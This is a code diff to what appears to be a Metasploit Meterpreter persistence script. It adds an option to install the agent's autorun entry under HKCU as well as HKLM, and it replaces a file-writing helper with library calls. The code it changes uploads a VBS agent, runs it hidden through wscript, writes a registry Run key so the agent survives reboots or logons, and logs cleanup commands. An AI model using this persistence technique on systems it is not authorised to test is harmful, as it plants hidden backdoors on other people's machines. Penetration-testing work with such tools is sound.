@@ -5,7 +5,7 @@
 #
 
 session = client
-
+key = "HKLM"
 #
 # Options
 #
@@ -15,6 +15,7 @@ opts = Rex::Parser::Arguments.new(
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"],
 	"-i"  => [ true,   "The interval in seconds between each connection attempt"],
 	"-X"  => [ false,  "Automatically start the agent when the system boots"],
+	"-U"  => [ false,  "Automatically start the agent when the User logs on"],
 	"-A"  => [ false,  "Automatically start a matching multi/handler to connect to the agent"]
 )
 
@@ -45,6 +46,10 @@ opts.parse(args) do |opt, idx, val|
 		delay = val.to_i
 	when "-X"
 		install = true
+		key = "HKLM"
+	when "-U"
+		install = true
+		key = "HKCU"
 	when "-A"
 		autoconn = true
 	end
@@ -63,16 +68,6 @@ logs = ::File.join(Msf::Config.log_directory, 'persistence', host_name + filenam
 # Cleaup script file name
 dest = logs + "/clean_up_" + filenameinfo + ".rc"
 
-#Writes a given string to a file specified
-def fs_filewrt(file2wrt, data2wrt)
-	output = ::File.open(file2wrt, "a")
-	if data2wrt
-		data2wrt.each_line do |d|
-			output.puts(d)
-		end
-	end
-	output.close
-end
 #
 # Create the persistent VBS
 #
@@ -104,7 +99,7 @@ print_status("Uploaded the persistent agent to #{tempvbs}")
 #
 proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
 print_status("Agent executed with PID #{proc.pid}")
-fs_filewrt(dest, "kill #{proc.pid}\n")
+file_local_write2file(dest, "kill #{proc.pid}\n")
 #
 # Setup the multi/handler if requested
 #
@@ -128,14 +123,13 @@ end
 #
 if(install)
 	nam = Rex::Text.rand_text_alpha(rand(8)+8)
-	print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-	key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
+	print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
 	if(key)
-		key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
-		print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-		fs_filewrt(dest, "reg deleteval -k \'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\' -v #{nam}\n")
+		registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,tempvbs,"REG_SZ")
+		print_status("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+		file_local_write2file(dest, "reg deleteval -k '#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -v #{nam}\n")
 	else
 		print_status("Error: failed to open the registry key for writing")
 	end
 end
-print_status("For cleanup use command: run multi_console_command -s #{dest}")
+print_status("For cleanup use command: run multi_console_command -rc #{dest}")
